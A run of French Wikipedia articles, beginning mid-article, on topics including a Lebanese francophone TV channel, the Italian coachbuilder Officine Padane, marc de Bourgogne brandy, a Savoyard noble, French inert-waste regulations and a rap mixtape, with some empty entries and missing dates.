Le , il marque son premier but en sélection lors d'un match de qualification à la Coupe d'Afrique des nations 2017, contre le Botswana (victoire 2-1).
En , il fait partie de la liste des 23 joueurs sélectionnés par Milutin Sredojević pour disputer la Coupe d'Afrique des nations 2017.
Palmarès.
 Avec le Vipers SC
Statistiques.
En club.
Le tableau ci-dessous récapitule les statistiques de Luwagga Kizito lors de sa carrière européenne en club :
But en équipe nationale.
"NB : Le score est affiché sans tenir compte du sens conventionnel en cas de match à l'extérieur (Ouganda-Adversaire)"

</doc>
<doc id="10575813" url="https://fr.wikipedia.org/wiki?curid=10575813" title="C33 (chaîne de télévision)">
C33 (chaîne de télévision)

C33 est une chaîne de télévision francophone libanaise créée en 1988 par la société LBC au Liban. Elle fait partie à partir de 1992 du Groupe LBC et elle est considérée comme l'alternative francophone de LBCI. Un grand succès entraîne ses programmes variés qui inspirent le public francophone.
De nombreuses émissions sont diffusées sur son antenne dont l'une des plus célèbres : le grand talk-show "Kalam Elnas" (en français : Les paroles des gens), une émission politique qui accueille les plus grands noms de la politique libanaise, du Moyen-Orient, de la France et toutes les personnalités de différents milieux sociaux. Ce show est reconduit sur sa chaîne sœur LBCI en 1995.
Une autre émission était diffusée : "toute la ville chante et danse", c'était un show musical qui réunissait différentes personnalités du monde de la chanson.
En 1996, la C33 est arrêtée en raison de la baisse des audiences et d'un marché publicitaire déficitaire.
Historique de la chaîne.
Dans les années 1980, le paysage francophone au Liban était renforcé par les journaux francophones et par la chaîne Le Neuf. L'influence de la France et de la langue française sur les libanais devient importante à une époque, où les liens politiques entre personnalités françaises et libanaises sont sujets de journal télévisé et de manchette de journaux d'une part, et où la francophilie libanaise se reconvertit entre citoyens libanais et expatriés en France d'autre part. C'était surtout cette tentative française de conquérir l'état culturel libanais en renforçant l'appartenance francophone des libanais par l'intermédiaire de l'Institut Français Du Liban, la Mission Culturelle en diffusant des émissions françaises sur la seule chaîne francophone de l'époque : la TL3 (ancien nom de Le Neuf). 
Toutefois, Le Neuf tombait dans des difficultés financières depuis la fin des années 1970, d'où le manque de ressources pour adapter des émissions à forte renommée. Entre solutions financières et rennaissances des programmes, le directeur de la LBC, concurrente directe de Télé Liban, trouve le bon plan en 1987 pour lancer une chaîne francophone qui pourrait suivre le mouvement francophone dans le pays. L'État français s'engagea pour participer au financement du projet qui put finalement être réalisé l'année suivante.
La concurrence espérée aux côtés de Le Neuf était atteinte. À ses débuts, les émissions diffusées inspiraient un grand nombre de francophones qui désiraient se divertir par de nouvelles adaptations. La C33 a diffusé pendant ses débuts l'A2 Journal du 20h en raison du financement de cette dernière par Antenne 2 (chaîne française publique à l'époque). Ce succès ne durera pas longtemps, les audiences de cette chaîne commencent à s'éroder entre 1993 et 1994 pour deux raisons : la première qui fut " la perte de vitesse du français ", d'où la recherche d'émissions n'intéressant que la part académique des téléspectateurs, la deuxième raison n'était d'autre que la diminution d'utilisation de la bande UHF par les services de diffusion des chaînes de télévision qui entraînait la restriction de la chaîne des yeux de ces derniers.
Cette situation ne cessait de se poursuivre. La C33, selon la directrice de ses programmes, devient non rentable. L'idée de proposer une nouvelle émission politique, mais cette fois en arabe, est survenue chez le directeur de la chaîne pour la faire renaître. En 1994, "Kalam Elnas" (en français : Paroles des gens) est lancée mais aussi diffusée sur la LBCI, chaîne principale du Groupe LBC. Ce talk-show politique rencontre un franc succès. Cependant, lors du déménagement du groupe à Adma en 1996, la chaîne est totalement abandonnée avec toutes ses émissions, seule "Kalam Elnas" reste sur LBCI jusqu'en 2016, devenant ainsi une des émissions politiques les plus regardées au Liban.

</doc>
<doc id="10575822" url="https://fr.wikipedia.org/wiki?curid=10575822" title="Liberté de l’information">
Liberté de l’information



</doc>
<doc id="10575825" url="https://fr.wikipedia.org/wiki?curid=10575825" title="Heather Berlin">
Heather Berlin

Heather A. Berlin (aussi H. A. Berlin), née à New York, est une neurologue américaine dont les recherches portent sur les relations entre le cerveau et le comportement, affectant la prévention et le traitement des troubles psychiques impulsifs et compulsifs.
Elle s'intéresse également aux bases neuronales de la conscience, aux processus inconscients dynamiques et à la créativité.
H. A. Berlin est l'hôte de la série de PBS "Science Goes to the Movies" et de la série "Superhuman Showdown" sur Discovery Channel.

</doc>
<doc id="10575826" url="https://fr.wikipedia.org/wiki?curid=10575826" title="Frank Amankwah">
Frank Amankwah

Frank Amankwah est un footballeur ghanéen né le à Obuasi. Il évoluait au poste de défenseur.
Biographie.
En club.
Frank Amankwah joue au Ghana, en Allemagne, aux Pays-Bas et en Grèce.
Il dispute sept matchs en deuxième division allemande, et six matchs en première division grecque.
En équipe nationale.
Il est médaillé de bronze avec le Ghana lors des Jeux olympiques d'été de 1992. Il dispute l'intégralité des matchs lors du tournoi olympique.
International ghanéen, il reçoit 33 sélections pour 2 buts marqués en équipe du Ghana entre 1992 et 1997. Il dispute notamment la Coupe d'Afrique des nations en 1994 et 1996. Le Ghana se classe quatrième de la CAN en 1996.
Palmarès.
"Avec Asante Kotoko :"
"Avec le Ghana :"

</doc>
<doc id="10575827" url="https://fr.wikipedia.org/wiki?curid=10575827" title="Sahara (film, 2017)">
Sahara (film, 2017)

Sahara est un long métrage d'animation franco-canadien réalisé par Pierre Coré et sorti en 2017.
Le film suit Ajar le serpent et son pote Pitt le scorpion qui décident de tenter leur chance dans l'oasis voisine où vit la haute bourgeoisie du désert saharien et d'y retrouver Eva, une belle femelle serpent verte dont Ajar est tombé fou amoureux. C’est le début de folles aventures qui les amèneront à traverser le désert à la poursuite de l’amour et plus encore à la découverte d’eux-mêmes.
Synopsis.
Dans le désert, où les animaux sont appelés "Dusties", Ajar le cobra et son meilleur ami, Pitt le scorpion, volent une pastèque à un chameau, pour la faire prendre par un cobra plus âgé nommé Saladin. Le duo est une cible fréquente de dénigrement par Saladin et est considéré comme des parias. Ajar, fatigué d'être un "perdant", décide qu'ils devraient aller dans l'Oasis, un refuge pour les serpents verts riches et très sophistiqués mais qui est interdit aux Dusties.
Ajar se déguise en serpent vert puis entre dans l'Oasis. Il rencontre un serpent vert nommé Eva, qui s'est déguisée en Dusty pour tenter de s'échapper de l'Oasis. Ils sont alors pris en embuscade par des oiseaux secrétaires, qui les chassent jusqu'au bord d'une falaise. Eva et Ajar sautent de la falaise et atterrissent dans une rivière. Les déguisements se lavent dans la rivière, révélant leurs véritables identités les uns aux autres. Étant un Dusty, Ajar n'est pas capable de nager et se noie presque, mais est sauvé par Eva, qui le ressuscite avec le bouche-à-bouche. Ajar et Eva deviennent amis après cela et Ajar tombe amoureux d'Eva, mais Eva est ensuite capturée par Omar, un charmeur et écorcheur de serpents.
Ajar donne la chasse, mais lui et Pitt sont capturés par Chief-Chief, l'un des oiseaux secrétaire gardant l'Oasis. Les deux sont emmenés à la base des oiseaux, où le chef-chef et les autres oiseaux menacent de les tuer. Cependant, Ajar utilise Gary, le frère paresseux et stupide d'Eva, comme otage, et ils s'échappent sur le dos de l'un des oiseaux secrétaires. Lorsque Pitt pique accidentellement l'oiseau, celui-ci perd connaissance et le trio continue au sol.
Pendant ce temps, Eva rencontre d'autres serpents qui ont été attrapés par Omar, y compris les jumeaux, Lulu Belle et Lily Belle, un charmant serpent vert nommé George, un serpent blanc nommé Pietra, qui ne l'aime pas, mais la salue comme les autres le font, et un python rouge nommé Rita. Les serpents racontent à Eva leurs professions, et Omar les sort alors tous, où il joue de la flûte. Eva tente d'échapper à Omar, mais est hypnotisée par le son de la flûte et repart. Lorsque les serpents sont remis dans le panier, Pietra propose à Eva une méthode d'évasion par un trou dans le panier pour tenter de se débarrasser d'elle. Cependant, les deux sont rattrapés par Omar. Il les oblige à participer à une danse. Eva gagne, tandis que Pietra est mise dans le panier de serpents à écorcher.
Gary, Ajar et Pitt, toujours dans leur quête, tombent dans une grotte, où ils sont accueillis par Glow-Worms. Le roi Glow-Worm leur donne des instructions pour trouver Eva, mais essaie ensuite de les attirer comme proies, et les trois s'échappent de justesse. Peu de temps après, ils montent dans une jeep avec quelques touristes, mais sont découverts et Pitt est séparé des autres. Ils trouvent alors un poisson des sables qui parle vite, qui leur laisse le nom de Souksoukville, puis s'en va. Ajar et Gary trouvent une oasis, où ils se reposent pour la nuit et deviennent lentement amis après qu'Ajar révèle que lui et Pitt sont les seuls amis qu'ils ont (depuis que la famille de Pitt a été tuée par les Touaregs) et Gary révèle qu'il n'a aucun ami du tout. Pitt reste au camp des touristes, où il rejoint un groupe de scorpions.
Ajar et Gary trouvent un puits à l'oasis. Ils descendent un seau pour échapper à une tempête de sable, puis arrivent dans une autre ville. Ils suivent les annonces d'Omar pour se rendre à son magasin, où Ajar voit Eva et les autres serpents piégés dans une cage, et George embrassant Eva. Prenant la rencontre pour une rencontre romantique, Ajar abandonne presque sa quête jusqu'à ce qu'il libère un ventilateur de plafond, qui tombe sur le dessus de la cage, libérant tous les serpents. Omar le voit et court chercher sa flûte, mais Ajar la prend.
Omar poursuit Ajar autour de la ville, où la tempête de sable fait rage. Ajar est poursuivi au sommet d'une mosquée, où Omar tente d'attraper la flûte, mais la casse. Il attrape Ajar pour qu'il ne tombe pas du bâtiment, mais la peau d'Ajar se détache et Omar disparaît dans la tempête de sable. La tempête se calme et Ajar tombe sur une plate-forme en contrebas. Il est retrouvé par Eva et Gary et on pense qu'il est mort, à leur grande consternation, mais il se réveille ensuite. Eva se rend compte qu'Ajar avait traversé un désert pour elle, et les deux s'embrassent. Omar apparaît alors, mais tombe inconscient après que Pitt l'ait piqué. Il les présente à Emily, un scorpion du groupe avec lequel il était resté plus tôt. Ajar, Eva, Emily, Pitt, Gary et Pietra partent en voiture de tourisme.
Alors que la camionnette démarre, le poisson des sables qui parle vite apparaît à côté d'un chameau et lui dit (ainsi qu'aux téléspectateurs) qu'Ajar et Eva pourraient retourner et vivre heureux pour toujours à l'Oasis et apprendre aux Dusties et Green Snakes à vivre ensemble comme égaux, mais il prétend n'avoir aucune idée si cela se produit ou non.

</doc>
<doc id="10575837" url="https://fr.wikipedia.org/wiki?curid=10575837" title="Officine Padane">
Officine Padane

La société Officine Padane SpA est une entreprise italienne de carrosserie industrielle faisant maintenant partie du groupe Industria Italiana Autobus créé en 2015.
L'histoire de Officine Padane.
En 1859, Angelo Orlandi, menuisier chaudronnier de son état, crée son propre atelier à Crespellano, en Émilie-Romagne, pour fabriquer des chariots de transport de marchandises et des charrettes de transport de passagers. Très vite, le succès de ses fabrications aidant, il doit agrandir son atelier et s'établit alors dans la bourgade voisine de Bazzano, dans des locaux mieux adaptés à ses activités.
En 1881, Angelo Orlandi déplace à nouveau son centre de fabrication dans la ville de Modène, via Emilia Ovest, où son succès grandissant, grâce à la qualité et au haut niveau de finition de ses carrosses, lui valent de grandes reconnaissances. Il contribue très largement à l'équipement des nouvelles lignes de transports publics avec ses carrosseries de tram et les carrosses. Il reçoit les premières commandes de diligences.
Ses trois fils, Augusto, Enrico et Giovanni, qui après leurs études se sont intéressés aux progrès de la construction automobile, entrent dans l'entreprise en 1899 et décident de construire le premier véritable autocar italien. Ce véhicule révolutionnaire était conçu sur un châssis Bonacini, avec un moteur Bolide de 20 CV.
L'autocar est produit en de nombreux exemplaires et remporte la "Médaille d'Or à l'Exposition Internationale de l'Automobile de Milan" de 1901. En septembre de la même année, ce véhicule est utilisé pour la première fois pour le transport de troupes militaires italiennes sur un véhicule motorisé, durant les grandes manœuvres effectuées par la Brigata Piacenza. L'autocar passe le col de la Cisa sur un trajet de 110 kilomètres, avec à bord 9 soldats et leur bardage, sur le trajet de montagne Collecchio-Passo della Cisa.
En 1907, Angelo Orlandi décède et l'entreprise est reprise par les trois fils qui déplacent à nouveau le centre de production près du parc Ferrari, toujours à Modène. Après le décès des deux frères ainés Enrico puis Augusto en 1921, les héritiers doivent diviser l'entreprise en deux la "Carrozzeria Angelo Orlandi" pour devenir la "Carrozzeria Giovanni Orlandi" et la Carrozzeria Emiliana Renzo Orlandi. Cette dernière société restant de la propriété du fils d'Enrico, Renzo. Pendant quelques années, les deux sociétés sont directement concurrentes.
La "Carrozzeria Giovanni Orlandi" est rachetée en 1943 par la société "Fonderia Vismara" qui en 1959 change la raison sociale en "Officine Padane", tout en poursuivant le même type de fabrications mais pour la distinguer de sa demi-sœur concurrente.
La Fonderia Vismara.
En 1888, Giuseppe Vismara nait à Seregno. Après ses études, il crée à Monza une entreprise de vente de papier. Après la Première Guerre mondiale il rachète deux usines de fabrication de papier. Pendant la Seconde Guerre mondiale, disposant de liquidités importantes gagnées avec ses activités industrielles, il rachète plusieurs petites sociétés en difficulté et stocke des matières premières pour alimenter ses usines après le conflit. En 1941, il crée à Milan la "Società Anonima Manifattura Carta".
En 1943, après le rachat de la société "Giovanni Orlandi" et de ses biens mobiliers, la direction de Vismara décide de poursuivre l’activité de carrosserie industrielle et de la développer. Dès la fin des années 1940, commence la production d'autobus en petite série, chose impensable auparavant puisque chaque transporteur voulait son modèle spécifique.
Officine Padane S.p.A..
En 1959, la société adopte une nouvelle raison sociale pour bien la distinguer de sa demi-sœur la Carrozzeria Orlandi et devient Officine Padane S.p.A.. Au sein du groupe Vismara, l'activité de production de machines pour l'industrie du papier se poursuit mais la production d'autobus connait une très forte croissance. La société Padane se démarque de la concurrence avec un design original qui tranche des anciennes carrosseries toutes en rondeur et qui plait avec un niveau de finition digne d'une automobile de luxe. L'époque est favorable aux solutions les plus hardies et les modèles évoluent chaque année.
En 1963, la "Carrozzeria Officine Padane" signe un accord de fabrication avec Maserati pour produire le modèle Mistral, accord qui sera suivi quelques années plus tard par celui signé avec le constructeur américain Stutz, aux carrosseries gigantesques et originales. Dean Martin, Frank Sinatra et Richard Burton seront les premiers à réserver leur nouvelle voiture dès qu'ils apprirent que Padane réaliserait la carrosserie de la nouvelle Stutz. Padane réalisera également un modèle limousine blindé de cette automobile pour le président Nixon. Durant cette période très faste pour Maserati, Padane réalisera les modèles Bora dessinée par Giugiaro et la Merak. Au début des années 1970, la production de la Carrozzeria Officine Padane était composée de 500 voitures et 300 autobus par an.
En 1968 la gamme de production de « Officine Padane » connait un nouvel essor avec une série de carrosseries très caractéristiques, la “linea 68”, qui connaîtra un succès bien au-delà des frontières de la péninsule avec un nombre de modèles fabriqué qui a fait pâlir les plus réputés constructeurs. Officine Padane avait inventé le style des vitres latérales de grande hauteur avec les montants inclinés. Tous les modèles reprenaient les phares avant carrés et doubles de la Fiat 125, quel que soit le châssis utilisé. Avec la première étape de l'abolition progressive des droits de douane en Europe, la Carrozzeria Officine Padane travaille beaucoup pour l'exportation et sur des châssis plus uniquement italiens mais de divers constructeurs qui incluent dans leur catalogue la version carrossée par Padane, comme Fiat, Lancia, Saurer, Magirus Deutz, Siccar, tous à moteur central à plat ou vertical arrière.
En 1972, Officine Padane lance une nouveauté qui marquera à tout jamais le style des autobus européens avec le "Tipo Esse", ses lignes tendues et carrées qui s'est imposée partout dans la construction automobile de l'époque. Cette carrosserie fera la renommée des Fiat 343 et Mercedes O302.
Ce sera au salon de Turin de que Officine Padane marquera à nouveau son empreinte sur la création des carrosseries d'autobus avec la série "Z" qui lui vaudra une véritable consécration de constructeur d'avant-garde et au style harmonieux. Sur le stand Padane trônent deux autobus Z3, l'un sur le nouveau châssis Mercedes 0303, l'autre sur la base du Fiat 370, avec les vitres latérales surteintées collées au nu extérieur, dans des teintes vert et rouge métallisé du meilleur effet.
La production connaît un nouvel essor avec cette série mais le constructeur ne néglige pas les autres modèles, autobus urbains sur des bases Fiat 418 et Fiat 314, les modèles traditionnels sur des bases Fiat 329 pour l'Italie et Mercedes LPO613 pour l'Allemagne, en versions tourisme, ligne et transport scolaire.
En 1978, des versions spéciales pour le marché français sont construites sur des châssis Saviem et Berliet. À partir de 1980, Padane lance la série Z4 destinée surtout aux marchés d'Europe du Nord sur des bases mécaniques Scania pour la Suède et la Finlande, Leyland, MAN ou Volvo pour le Royaume-Uni et Mercedes pour l'Allemagne. Mais tous ces constructeurs, déçus de ne pas avoir su répondre aux attentes de leurs clients, s'inspirent de cette série Z4 pour concevoir leurs nouveautés dans le dos de Padane.
En 1987, l'activité ayant chuté bien que les nouveaux modèles de la série "X" toujours à la pointe sont disponibles, la division carrosserie doit être vendue. C'est la société Socimi qui construit des trolleybus avec Iveco qui la rachète. En 2000, malgré une légère reprise de l'activité avec la coupe du monde de football "Italia 1990", la société est mise en liquidation.
Le nom Padane, une illustre figure dans le cercle fermé des constructeurs d'autobus et symbole des autobus de tourisme de luxe, est racheté par Stefano Del Rosso qui a repris le constructeur BredaMenarinibus pour créer Industria Italiana Autobus S.p.A. en 2015.

</doc>
<doc id="10575844" url="https://fr.wikipedia.org/wiki?curid=10575844" title="Madison (Pennsylvanie)">
Madison (Pennsylvanie)

Madison est un "borough" dans le comté de Westmoreland, Pennsylvanie, États-Unis. Sa population s’élevait à lors du recensement.
Le "borough" a été nommé en hommage à James Madison, président des États-Unis.

</doc>
<doc id="10575847" url="https://fr.wikipedia.org/wiki?curid=10575847" title="Marc de Bourgogne">
Marc de Bourgogne

Un marc de Bourgogne, ou eau-de-vie de marc de Bourgogne, est une eau-de-vie issue de la distillation des marcs de raisin. Titrant 40 % du volume en alcool au minimum, il bénéficie d'une appellation d'origine contrôlée française par décret depuis le , confirmé en 1946 ; le cahier des charges actuel date de mars 2011.
Le marc de Bourgogne provient de la distillation dans l’alambic des marcs de raisin (on parle des « marcs » pour ce qui reste sur le pressoir après pressurage et avant distillation et du « marc » pour le produit distillé), que l'on appelle la « genne » en Bourgogne, qui est retirée du pressoir après pressurage et qui est composée des peaux de raisins, des pépins et des rafles (bois et queue de la grappe). Le marc produit peuvent éventuellement être « égrappé » : il est alors produit avec du raisin dont on a retiré la rafle.
Le marc de Bourgogne (AOC) est une des quatre indications géographiques (IG) de spiritueux et eaux-de-vie au sein de la Bourgogne, avec le cassis de Dijon (IG), le cassis de Bourgogne (IG) et la fine de Bourgogne (AOC).
Cahier des charges.
Zone géographique.
Pour obtenir l'AOC, les marcs de raisin doivent provenir de l'aire géographique de la Bourgogne viticole (soit 388 communes de Côte-d'Or, du Rhône, de Saône-et-Loire et de l'Yonne) tout comme le stockage, la distillation et le vieillissement des eaux-de-vie.
Encépagement.
Les marcs sont issus au choix de raisins rouges ou blancs ou des deux, appartenant aux cépages suivants : aligoté B, césar N, chardonnay B, gamay N, melon B, pinot noir N, pinot gris G, pinot blanc B, sacy B, sauvignon B, ou tressot N. Il n'y a pas de contrainte d'assemblage.
Élaboration.
Les marcs de raisins sont distillés selon le procédé de distillation discontinu multi-étagé à l'aide d'alambics constitués de vases de distillation et de colonnes de concentration. Les alambics utilisés sont constitués de trois vases maximum à chargement successif et d'au maximum trois colonnes de concentration montées en série. Les vases de distillation sont en cuivre. Ils présentent chacun un volume maximum de 630 litres et sont chauffés à feu nu ou par injection de vapeur. Les colonnes sont en cuivre. Chaque colonne présente une hauteur inférieure ou égale à 1,50 mètre. Le nombre total de plateaux pour l'ensemble des colonnes est au maximum de 7. Toute distillation doit être précédée d'un nettoyage de l'alambic, à la vapeur ou à l'eau bouillante. Les eaux-de-vie produites doivent présenter à la sortie de l'alambic, à la température de 20 °C, un titre alcoométrique volumique inférieur ou égal à 72 %.
Les marcs de raisin sont distillés dans un alambic en cuivre avant le de l'année suivant la vendange. Les eaux-de-vie produites doivent avoir une teneur en alcool inférieure à 72 % à la sortie de l'alambic. En pratique, il dépasse rarement les 52 %. L'enrichissement des marcs et l'ajout de conservateur sont interdits. Le marc de Bourgogne doit être élevé en fûts de chêne (228 litres) ou en foudres (plusieurs hectolitres) durant au minimum deux ans.
Âge des marcs de Bourgogne.
Il peut bénéficier de la mention « vieux » après trois ans, « très vieux » après six ans et « hors d'âge » après dix ans de fûts. La faible utilisation de futaille neuve permet de préserver une part des arômes fruités et floraux qui participent à la qualité du marc de Bourgogne, Une qualité qui dépend aussi de la richesse de la matière première, de la justesse de la distillation, la maîtrise des assemblages ou de la durée des vieillissements.
Production et économie.
Les vignerons n'ont pas le droit de distiller eux-mêmes en Bourgogne. Il existe une douzaine d’entreprises de distillation utilisant des alambics souvent centenaires transmis de génération en génération, qui s'installent dans les villages et procèdent à la distillation. Une cinquantaine de viticulteurs élèvent eux-mêmes leur eau-de-vie. Cependant, la plupart (environ 150) vendent leurs marcs à des négociants. La production actuelle est de par an. 25 % sont exportés (rapportés sur le site Eaux de Vie de Bourgogne en 2025). La production était de en 2009 (soit de ).
Gastronomie.
Le marc est traditionnellement un digestif. Il doit être viril sans agressivité avec du gras pour apporter de la douceur en bouche, des notes herbacées, épicées, des arômes légèrement fruités avec des notes de caramel. Il se caractérise par une couleur jaune ambré. Il peut être aussi consommé en cocktails, avec du cassis, le "mêlé-cass". Il est utilisé dans l'affinement de l'époisses et dans certaines recettes de cuisine dans lesquelles il relève l'élégance des plats : tartare au marc, cailles au marc, soufflé glacé au marc, bœuf à la Bourguignonne mariné au vin et au marc, etc.
Différence entre marc et fine de Bourgogne.
Le marc et la fine sont des produits qui diffèrent dans leur mode de production et dans les caractéristiques du produit fini.
Le marc de Bourgogne résulte de la distillation des peaux, des pépins et des rafles après la fermentation des vins rouges. Après le pressurage, il reste encore de l'alcool résiduel dans les marcs, qui ont servi à faire fermenter le vin.
La fine de Bourgogne est le résultat de la distillation du vin ou des dépôts du vin (les « lies » ). Le produit fini est différent, avec des touches de fruits confits, d'ananas, ou de caramel.

</doc>
<doc id="10575855" url="https://fr.wikipedia.org/wiki?curid=10575855" title="Humbert V de Chevron">
Humbert V de Chevron

Humbert de Chevron ou de Villette, dit Humbert V, († entre 1361 et 1367) est un noble savoyard, seigneur de Chevron, issu de la famille de Chevron Villette. Il est bailli du Chablais à deux reprises au cours du , avant d'hériter du vidomnat de Sion.
Biographie.
Origines.
La date de naissance de Humbert de Chevron reste inconnue, mais il est mentionné pour la première fois en 1318. Il est le fils du chevalier et seigneur Humbert (IV) de Villette et de Demoiselle Philippine. Son père serait bailli du Bugey et de Novalaise, ainsi que châtelain de Rossillon, entre 1306 et 1309.
Humbert est marié avec Amphélise (ou Ancilésie/Ancilidie), fille unique et héritière de Pierre (II) d'Aigle, vidomne et sénéchal de la cité de Sion et de Jeannette de Blonay.
Seigneur savoyard et valaisan.
Humbert de Chevron devient bailli du Chablais pour le comte de Savoie en 1319, puis à nouveau entre 1328 et 1330. Il est châtelain d'Évian et Féternes de -, puis de 1340 à 1343.
À la mort de son beau-père, en 1343, il hérite des droits sur la sénéchalie épiscopale de Sion et les vidomnats d'Aigle, Sion-Bramois, Sierre et Viège, avec des doits aux Ormonts, à Ardon-Chamoson, Grône, Chalais, Verconrin, Muzot, Bernune, Rarogne et Naters. Le vidomnat de Sion-Bramois est reconnu à la suite d'un arbitrage en 1344, ceux de Sierre et de Viège sont soumis à une enquête. Il achète les droits de la famille d'Ollon sur le vidomnat de Sion. Le titre de vidomne de Sion reste dans la famille de Chevron Villette jusqu'en 1560.
Il devient par ailleurs le premier le châtelain de Beaufort le , à la suite de l'obtention de la baronnie du Faucigny par le comte de Savoie, avant de devenir membre du Conseil résident de Chambéry.
Mort et succession.
Humbert de Chevron meurt entre 1361 et « avant 1367 ». Son corps est inhumé à l'abbaye de Tamié.
Ses fils, Humbert [VI] et Pierre [I], sont covidomnes de Sion. Pierre devient le second sénéchal et hérite de l'ensemble des vidomnats de son père.
Sa fille Marguerite est mariée vers 1367 à Humbert d'Arvillard « en Allevard », surnommé le "Bâtard de Savoie", fils du comte Aymon. Ce dernier avait épousé en premières noces, Andize d'Arvilars.
Une partie de la famille de Chevron Villette fait souche dans cette partie de la Suisse.
Famille.
Humbert de Chevron épouse Amphélise ou Ancilidie (/78), fille de Pierre (II) d'Aigle. Ils ont trois enfants

</doc>
<doc id="10575857" url="https://fr.wikipedia.org/wiki?curid=10575857" title="Kollikodon ritchiei">
Kollikodon ritchiei



</doc>
<doc id="10575858" url="https://fr.wikipedia.org/wiki?curid=10575858" title="Sioux Rapids (Iowa)">
Sioux Rapids (Iowa)

Sioux Rapids est une ville du comté de Buena Vista, en Iowa, aux États-Unis. Elle est nommée par rapport aux rapides de la rivière Little Sioux. En 1869, Sioux Rapids est le siège du comté de Buena Vista. En 1876, le palais de justice de la ville brûle et le siège du comté est transféré à Storm Lake, en 1878. Elle est incorporée le .

</doc>
<doc id="10575862" url="https://fr.wikipedia.org/wiki?curid=10575862" title="Louis Du Four de Longuerue">
Louis Du Four de Longuerue



</doc>
<doc id="10575868" url="https://fr.wikipedia.org/wiki?curid=10575868" title="Installation de stockage de déchets inertes">
Installation de stockage de déchets inertes

En France, une installation de stockage de déchets inertes (ISDI) (ex- ) est une installation classée pour la protection de l'environnement (ICPE) qui réceptionne des déchets inertes en vue de les éliminer par enfouissement ou comblement sur site.
Définition.
L'arrêté ministériel du précise que les installations de stockage de déchets inertes (ISDI) sont des installations de dépôt de déchets inertes, à l'exclusion de celles où :
Historique réglementaire.
Les installations de stockage de déchets inertes, appelées à l'époque , étaient initialement régies par le code de l'urbanisme et leur exploitation relevait d'une décision du maire de la commune d'implantation. 
Lors de la transposition de la directive européenne 1999/31/CE, un régime d’autorisation spécifique a été créé pour l’exploitation des installations de stockage de déchets inertes dans le code de l'environnement. Ce régime s'inspirait des procédures administratives relatives aux installations classées pour la protection de l'environnement (ICPE) du fait que les cibles à protéger sont les mêmes (environnement, personnes et biens) mais ces procédures ont été allégées du fait que les sources de danger ont été considérés comme étant moins importantes étant donné qu’il s’agit de déchets inertes. Ainsi, depuis le , tout exploitant d’une nouvelle ISDI devait bénéficier d’une autorisation préfectorale et les exploitants des ISDI déjà en fonctionnement étaient tenus de déposer un dossier de demande d’autorisation avant le , sauf si l’exploitation devait cesser avant cette date.
À partir de 2009, la mise en place progressive d'un régime intermédiaire d'autorisation simplifiée (entre celui de la déclaration et celui de l'autorisation), appelé régime de l'enregistrement, pour les ICPE a permis, à la suite du décret 2014-1501 du , de supprimer le régime d'autorisation spécifique des ISDI et d'intégrer pleinement les ISDI dans la législation des ICPE sous la rubrique 2760-3.
Classement ICPE.
Les installations de stockage de déchets inertes sont concernées par la rubrique 2760-3 de la nomenclature des installations classées et sont soumises à enregistrement. Cette autorisation simplifiée est délivrée sous la forme d'un arrêté préfectoral qui impose à l'exploitant le respect d'un certain nombre de prescriptions techniques permettant de limiter l'impact environnemental de l'installation et qui sont notamment issues de deux arrêtés ministériels du .
L'instruction des demandes d'enregistrement ainsi que le contrôle du respect des prescriptions imposées est réalisé par l'inspection des installations classées.
Amiante.
Plus aucun déchet d’amiante n’est admis en installation de stockage de déchets inertes : ils doivent être éliminés soit dans des installations de stockage de déchets non dangereux (ISDND), soit dans des installations de stockage de déchets dangereux (ISDD).

</doc>
<doc id="10575869" url="https://fr.wikipedia.org/wiki?curid=10575869" title="Samuel Osei Kuffour">
Samuel Osei Kuffour



</doc>
<doc id="10575887" url="https://fr.wikipedia.org/wiki?curid=10575887" title="Samuel Kumah">
Samuel Kumah



</doc>
<doc id="10575892" url="https://fr.wikipedia.org/wiki?curid=10575892" title="A7 (mixtape)">
A7 (mixtape)

A7 est la première mixtape du rappeur français SCH, sortie le sous les labels Braabus Music, Def Jam France et Universal. 
Genèse.
SCH est repéré par Lacrim à la suite d'un remix du titre "On fait pas ça" à la fin de l'année 2014. Celui-ci lui offre alors l'occasion de sortir un titre solo, "Millions", sur la mixtape "R.I.P.R.O. Volume I". Cette opportunité permet à SCH de gagner en exposition et de signer par la suite chez Def Jam France.
La première partie du CD est composée par Guilty et DJ Ritmin du collectif toulousain Katrina Squad et la seconde partie par DJ Kore. Ce dernier assure également la direction artistique du projet.
Le titre est une référence à l'autoroute A7 reliant Lyon à Marseille.
Pochette.
La pochette, réalisée par Koria à La Plaine Saint-Denis, représente SCH torse nu faisant un doigt d'honneur. La composition fait référence au film Blow. Le choix de Koria sur la cover s'est porté un portrait de SCH du fait que le personnage se suffisait à lui-même. Il voulait aussi qu'on ne puisse pas comprendre visuellement le genre musical que proposerait la mixtape.
Promotion.
Le titre "C'est la vie" sort le en tant que morceau promotionnel. 
Le , SCH sort le morceau bonus "Morpheus", ne figurant pas sur le projet.
Réception.
Accueil critique.
Selon le site Genius, ce projet est considéré par les auditeurs comme le meilleur de la discographie de SCH, ainsi que comme un classique du rap français de la dernière décennie, notamment grâce à sa direction artistique remarquable.
Ventes.
Lors de sa première semaine d'exploitation, la mixtape s'écoule à et se place en première position du classement digital. Elle dépasse les vendus en .
En mai 2016, le nombre total de ventes est porté à exemplaires, auquel sont ajoutés ventes d'équivalents streams.
En 2021, le nombre de ventes dépasse la barre des .

</doc>
<doc id="10575893" url="https://fr.wikipedia.org/wiki?curid=10575893" title="Rue des Nonnaindières">
Rue des Nonnaindières



</doc>
<doc id="10575903" url="https://fr.wikipedia.org/wiki?curid=10575903" title="Bikini Royale 2">
Bikini Royale 2

Bikini Royale 2 est un film américain de série B écrit et réalisé par Fred Olen Ray, sorti directement en vidéo en 2010.

</doc>
<doc id="10575904" url="https://fr.wikipedia.org/wiki?curid=10575904" title="H. A. Berlin">
H. A. Berlin



</doc>
<doc id="10575912" url="https://fr.wikipedia.org/wiki?curid=10575912" title="Pierrette Cassou-Noguès">
Pierrette Cassou-Noguès

Pierrette Cassou-Noguès (née en 1945 à Rabat) est une mathématicienne française, qui s'occupe de géométrie arithmétique. Elle est professeure à l'Université de Bordeaux I.
Cassou-Noguès soutient en 1978, sous la direction de à l'Université de Bordeaux I, sa thèse de doctorat intitulée "Valeurs sur les entiers de fonctions zêta de corps de nombres et des fonctions L de courbes elliptiques". En tant que post-doctorante, elle travaille en 1980 à l'Institute for Advanced Study. En 1985, elle est maître de conférences "Benjamin Peirce" à l'Université Harvard. 
